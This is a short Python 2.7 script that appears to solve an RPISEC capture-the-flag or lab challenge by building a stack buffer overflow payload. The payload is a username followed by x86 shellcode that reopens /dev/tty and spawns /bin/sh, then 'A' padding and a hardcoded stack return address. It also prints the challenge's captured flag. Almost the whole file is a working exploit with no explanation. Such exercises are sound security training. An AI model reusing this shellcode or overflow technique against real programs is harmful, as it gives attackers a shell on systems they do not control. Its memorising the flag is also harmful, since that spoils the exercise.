#!/usr/bin/python2.7
# FLAG: th3r3_iz_n0_4dm1ns_0n1y_U!
# Shellcode reference: https://stackoverflow.com/questions/2859127/shellcode-for-a-simple-stack-overflow-exploited-program-with-shell-terminates-d
import binascii

shellcode = ""
USERNAME = "rpisec\n"
BIN_SH = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68\x2f\x74\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
BUF_ADDR = "\x5C\xF5\xFF\xBF"

shellcode += USERNAME
shellcode += BIN_SH
shellcode += "A" * (80 - len(shellcode) + len(USERNAME))
shellcode += BUF_ADDR

print shellcode
